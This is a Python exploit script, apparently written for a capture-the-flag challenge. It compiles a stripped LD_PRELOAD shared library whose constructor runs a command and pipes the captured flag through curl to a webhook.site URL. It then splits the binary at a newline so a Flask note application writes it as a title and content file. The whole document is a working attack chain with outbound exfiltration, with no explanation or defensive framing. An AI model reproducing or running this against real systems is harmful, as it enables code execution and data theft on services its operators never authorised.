#!/usr/bin/env python3
"""
Compiles a minimal LD_PRELOAD hook.so, strips it aggressively to stay under
the 16 KiB HAProxy limit, then splits it at the first newline byte so Flask
can write it as a note file (title + content).
"""

import hashlib
import shutil
import subprocess
import sys
from pathlib import Path

out = Path("output")
command = '/getflag please give me the flag | curl -sG --data-urlencode "flag@-" https://webhook.site/e6397498-8329-4c1c-95e1-2af62fd29aaf'

gcc = shutil.which("gcc")
objcopy = shutil.which("objcopy")
strip_bin = shutil.which("strip")

if not gcc:
    print("gcc not found", file=sys.stderr)
    sys.exit(1)

if not objcopy:
    print("objcopy not found", file=sys.stderr)
    sys.exit(1)

out.mkdir(exist_ok=True)

escaped = command.encode("unicode_escape").decode("ascii").replace('"', r"\"")
src = """#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
    unsetenv("LD_PRELOAD");
    system("%s");
    _exit(0);
}
""" % escaped

(out / "hook.c").write_text(src, encoding="ascii")

try:
    subprocess.run([
        gcc,
        "-shared",
        "-fPIC",
        "-Os",
        "-s",
        "-fno-asynchronous-unwind-tables",
        "-fno-exceptions",
        "-fvisibility=hidden",
        "-Wl,--gc-sections",
        "-Wl,--build-id=none",
        "-Wl,--hash-style=gnu",
        "-Wl,-z,norelro",
        str(out / "hook.c"),
        "-o",
        str(out / "hook.so"),
    ], check=True)

    subprocess.run([
        objcopy,
        "--remove-section=.note.gnu.property",
        "--remove-section=.comment",
        str(out / "hook.so"),
        str(out / "hook.so"),
    ], check=True)

    if strip_bin:
        subprocess.run([strip_bin, "--strip-section-headers", str(out / "hook.so")], check=True)

except subprocess.CalledProcessError as e:
    print("compilation failed:", e, file=sys.stderr)
    sys.exit(e.returncode or 1)

payload = (out / "hook.so").read_bytes()

split = payload.find(b"\n")
if split == -1:
    print("payload does not contain a newline byte", file=sys.stderr)
    sys.exit(1)

title = payload[:split].decode("latin-1").encode("utf-8")
content = payload[split + 1:].decode("latin-1").encode("utf-8")

title_file = out / "note_title.utf8.bin"
content_file = out / "note_content.utf8.bin"

title_file.write_bytes(title)
content_file.write_bytes(content)

print("wrote", out / "hook.so")
print("split offset:", split)
print("sha256:", hashlib.sha256(payload).hexdigest())
